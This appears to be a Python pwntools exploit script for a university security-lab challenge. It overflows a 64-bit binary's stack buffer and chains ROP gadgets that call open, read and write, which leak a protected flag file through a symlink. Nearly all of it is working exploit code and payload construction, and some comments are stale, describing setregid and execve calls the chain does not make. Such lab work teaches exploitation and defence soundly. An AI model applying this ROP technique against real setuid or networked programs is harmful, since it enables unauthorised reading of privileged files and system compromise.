#!/usr/bin/env python2

import os

# import pwntools
from pwn import *

env = {}

# prepare the program name and args
argv = [
    #"/home/labs/week6/challenges/rop/rop-4-64",
    "./rop-4-64",
]

p = process(argv, env=env)

open_addr = p.elf.symbols['open']
read_addr = p.elf.symbols['read']
write_addr = p.elf.symbols['write']
string_addr = 0x4006cf # 0xb8

#0x0000000000400743 : pop rdi ; ret
#0x0000000000400668 : pop rdx ; ret
#0x0000000000400741 : pop rsi ; pop r15 ; ret


p_rdi_r = 0x400743
p_rdx_r = 0x400668
p_rsi_p_r15_r = 0x400741

buffer_addr = 0x601040

if os.path.exists("\xb8"):
    os.unlink("\xb8")
if not os.path.exists("\xb8"):
    os.symlink("flag-4", "\xb8")

# prepare an exploit string
# [dummy][setregid][pop-pop-ret][36001][36001][execve][XXXX][addr of "\xb8"][0][0]

calling_open = \
    p64(p_rdi_r) + p64(string_addr) + \
    p64(p_rsi_p_r15_r) + p64(0) + p64(0) + \
    p64(open_addr)

# pop %rdi <- 36002
# pop %rsi <- 36002, pop %r15 <- 36002
# ret <- setregid_addr

calling_read = \
    p64(p_rdi_r) + p64(3) + \
    p64(p_rsi_p_r15_r) + p64(buffer_addr) + p64(0) + \
    p64(p_rdx_r) + p64(100) + \
    p64(read_addr)

calling_write = \
    p64(p_rdi_r) + p64(1) + \
    p64(p_rsi_p_r15_r) + p64(buffer_addr) + p64(0) + \
    p64(p_rdx_r) + p64(100) + \
    p64(write_addr)


exploit_string = "D"* 136 + calling_open + calling_read + calling_write

# Print your exploit as a txt file.
# You can use this in gdb, e.g.,
#   gdb-peda$ r < exploit.txt
with open("exploit.txt", "wb") as f:
    f.write(exploit_string)
    f.close()

# send the exploit
p.sendline(exploit_string)

# get an interactive pipe
print p.interactive()
